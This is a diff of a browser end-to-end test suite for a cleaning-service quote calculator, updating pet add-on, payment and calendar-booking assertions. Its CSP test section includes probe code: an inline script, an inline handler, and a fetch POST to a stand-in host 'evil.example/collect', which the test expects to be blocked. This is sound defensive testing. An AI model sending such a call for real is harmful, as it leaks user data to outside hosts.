@@ -135,18 +135,16 @@ try {
   assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 3);
   assert.equal(await evaluate('document.getElementById("addinfo-group-pets").classList.contains("wizard-field-missing")'), true);
 
-  // Choose "Yes, we have pets" -> auto-adds $35 Pet Add-On (200 + 35 = 235)
+  // Choose "Yes, we have pets" -> auto-adds flat $35 Pet Hair & Detailing fee (200 + 35 = 235)
   await evaluate('document.getElementById("addinfo-pets-yes").click()');
   assert.equal(await evaluate('window.SmartsProCurrentQuote.state.addons.pets'), 1);
   assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 235);
 
-  // Switch to "No pets" -> resets pets add-on to 0, greys out #addon-item-pets, and shows lock note
+  // Switch to "No pets" -> resets pets add-on to 0 ($200) and verify duplicate Step 5 pet card is removed
   await evaluate('document.getElementById("addinfo-pets-no").click()');
   assert.equal(await evaluate('window.SmartsProCurrentQuote.state.addons.pets'), 0);
   assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 200);
-  assert.equal(await evaluate('document.getElementById("addon-item-pets").classList.contains("is-disabled-addon")'), true);
-  assert.equal(await evaluate('document.getElementById("addon-pets-lock-note").classList.contains("is-hidden")'), false);
-  assert.equal(await evaluate('document.getElementById("addon-pets-lock-note").textContent'), 'You chose no pets in additional information');
+  assert.equal(await evaluate('document.getElementById("addon-item-pets")'), null);
 
   // Complete remaining 3 Additional Information questions and advance to Step 4 (Frequency)
   await evaluate('document.querySelector(\'[data-addinfo-val="1-3 Months ago"]\').click()');
@@ -162,18 +160,15 @@ try {
     assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.discountRate'), 0);
     assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.discountAmount'), 0);
     assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 200);
-    assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.depositAmount'), 100);
-    assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.remainingBalance'), 100);
+    assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.onlinePaymentsEnabled'), false);
   }
 
   await evaluate('document.getElementById("btn-fridge-plus").click()');
   assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 265);
-  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.depositAmount'), 132.5);
-  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.remainingBalance'), 132.5);
-  assert.equal(await evaluate('document.getElementById("summary-deposit-val").textContent'), '$132.50');
-  assert.equal(await evaluate('document.getElementById("summary-balance-val").textContent'), '$132.50');
-  assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.depositRate'), 0.5);
-  assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.refundPolicy'), 'NO_REFUNDS');
+  assert.equal(await evaluate('document.getElementById("summary-dispatch-val").textContent'), 'Calendar Slot + Email');
+  assert.equal(await evaluate('document.getElementById("summary-online-payment-val").textContent'), 'None Required');
+  assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.onlinePaymentEnabled'), false);
+  assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.paymentPolicy'), 'NO_ONLINE_PAYMENT_REQUIRED');
   assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.pricingModel'), 'FLAT_RATE_NO_RECURRING_DISCOUNTS');
   assert.equal(await evaluate('getComputedStyle(document.getElementById("summary-addons-row")).display'), 'flex');
   for (const [input, expected] of [['-100', 400], ['999999', 6000], ['', 400], ['1800', 1800]]) {
@@ -184,8 +179,14 @@ try {
   await evaluate('new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)))');
   assert.equal(await evaluate('document.getElementById("booking-modal-overlay").classList.contains("open")'), true);
   assert.equal(await evaluate('document.getElementById("modal-recap-total").textContent'), '$265.00');
-  assert.equal(await evaluate('document.getElementById("modal-recap-deposit").textContent'), '$132.50 (Non-Refundable)');
-  assert.equal(await evaluate('document.getElementById("modal-recap-balance").textContent'), '$132.50');
+  assert.equal(await evaluate('!!document.getElementById("calendar-date-grid")'), true);
+  assert.equal(await evaluate('!!document.getElementById("calendar-slot-grid")'), true);
+  assert.equal(await evaluate('!!document.getElementById("upcoming-bookings-list")'), true);
+  assert.equal(await evaluate('!!document.getElementById("intake-first-name")'), true);
+  assert.equal(await evaluate('!!document.getElementById("intake-last-name")'), true);
+  assert.equal(await evaluate('!!document.getElementById("intake-phone")'), true);
+  assert.equal(await evaluate('!!document.getElementById("intake-email")'), true);
+  assert.equal(await evaluate('!!document.getElementById("intake-notes")'), true);
   assert.equal(await evaluate('document.activeElement.id'), 'modal-close-btn', await evaluate(`JSON.stringify({ active: document.activeElement.outerHTML.slice(0, 150), modalVisibility: getComputedStyle(document.getElementById('booking-modal-overlay')).visibility, buttonVisibility: getComputedStyle(document.getElementById('modal-close-btn')).visibility, rect: document.getElementById('modal-close-btn').getBoundingClientRect().toJSON() })`));
   await evaluate('document.dispatchEvent(new KeyboardEvent("keydown", {key:"Escape"}))');
   assert.equal(await evaluate('document.getElementById("booking-modal-overlay").classList.contains("open")'), false);
@@ -209,7 +210,7 @@ try {
   assert.ok(responses.filter(response => response.url.startsWith(base)).every(response => response.status === 200), 'A page asset failed to load');
   assert.ok(requests.every(url => url.startsWith(base)), 'Unexpected third-party network request');
   assert.equal(await evaluate('[...document.fonts].filter(font => font.status === "loaded").length'), 3);
-  console.log('PASS calculator, estimate modal, mobile layout, local fonts, legacy cleanup, and unavailable intake');
+  console.log('PASS calculator, estimate modal, calendar scheduler, mobile layout, local fonts, and legacy cleanup');
 
   // Exercise the browser's real CSP enforcement with harmless attack probes.
   await evaluate(`(() => {
@@ -222,13 +223,13 @@ try {
     button.click();
   })()`);
   assert.equal(await evaluate('!!window.__inlineExecuted || !!window.__handlerExecuted'), false);
-  assert.equal(await evaluate(`fetch('${base}/api/bookings', {method:'POST', body:'probe'}).then(() => false, () => true)`), true);
+  assert.equal(await evaluate(`fetch('https://evil.example/collect', {method:'POST', body:'probe'}).then(() => false, () => true)`), true);
   await evaluate('new Promise(resolve => setTimeout(resolve, 100))');
   const violations = await evaluate('window.__violations');
   assert.ok(violations.includes('script-src-elem'));
   assert.ok(violations.includes('script-src-attr'));
   assert.ok(violations.includes('connect-src'));
-  console.log('PASS inline script, inline event handler, and network submission blocked by CSP');
+  console.log('PASS inline script, inline event handler, and third-party network submission blocked by CSP');
 
   await send('Emulation.setScriptExecutionDisabled', { value: true });
   await send('Page.navigate', { url: base });
